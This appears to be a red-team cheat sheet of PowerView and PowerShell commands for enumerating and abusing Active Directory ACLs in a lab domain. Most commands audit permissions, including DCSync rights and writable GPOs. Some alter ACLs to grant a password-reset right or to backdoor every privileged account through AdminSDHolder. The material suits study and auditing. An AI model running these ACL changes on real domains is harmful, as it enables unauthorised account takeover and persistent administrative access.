# Domain ACL

## General

- Access Control Entries (ACE) correspond to individual permission or audits access
- Who has permission and what can be done on an object?
- Two types:
  - DACL -> Defines the permissions trustees (a user or group) have on an object
  - SACL - Logs success and failure audit messages when an object is accessed

## Enumerate ACLs without Resolving GUIDs

```powershell
# AD Module
(Get-ACL 'CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local').Access
```

## Get the ACLs Associated with the Specified Object

```powershell
# PowerView
Get-ObjectACL -SamAccountName "Users" -ResolveGUIDs
```

## Get the ACLs Associated with the Specified Prefix to Be Used for Search

```powershell
# PowerView
Get-ObjectACL -ADSPrefix 'CN=Administrator,CN=Users' -Verbose
```

## Get the ACLs Associated with the Specified LDAP Path to Be Used for Search

```powershell
# PowerView
Get-ObjectACL -ADSPath "LDAP://CN=Domain Admins,CN=Users,DC=dc01,DC=dc02,DC=local" -ResolveGUIDs -Verbose
```

## Search for Interesting ACEs

```powershell
# PowerView
Invoke-ACLScanner -ResolveGUIDs
```

## Get the ACLs Associated with the Specified Path

```powershell
# PowerView
Get-PathACL -Path "\\dc01.lab.local\sysvol"
```

## Enumerate Who Has Rights to the 'matt' User in 'testlab.local', Resolving Rights GUIDs to Names

```powershell
# PowerView
Get-DomainObjectAcl -Identity matt -ResolveGUIDs -Domain testlab.local
```

## Grant User 'will' the Rights to Change 'matt's Password

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity matt -PrincipalIdentity will -Rights ResetPassword -Verbose
```

## Audit the Permissions of AdminSDHolder, Resolving GUIDs

```powershell
# PowerView
Get-DomainObjectAcl -SearchBase 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -ResolveGUIDs
```

## Backdoor the ACLs of All Privileged Accounts with the 'matt' Account through AdminSDHolder Abuse

```powershell
# PowerView
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
```

## Retrieve *most* Users Who Can Perform DC Replication for dev.testlab.local (i.e. DCsync)

```powershell
# PowerView
Get-DomainObjectAcl "dc=dev,dc=testlab,dc=local" -ResolveGUIDs | ? {
    ($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')
}
```

## Enumerate Permissions for GPOs where Users with RIDs of > -1000 Have Some Kind of Modification/Control Rights

```powershell
# PowerView
Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')}
```
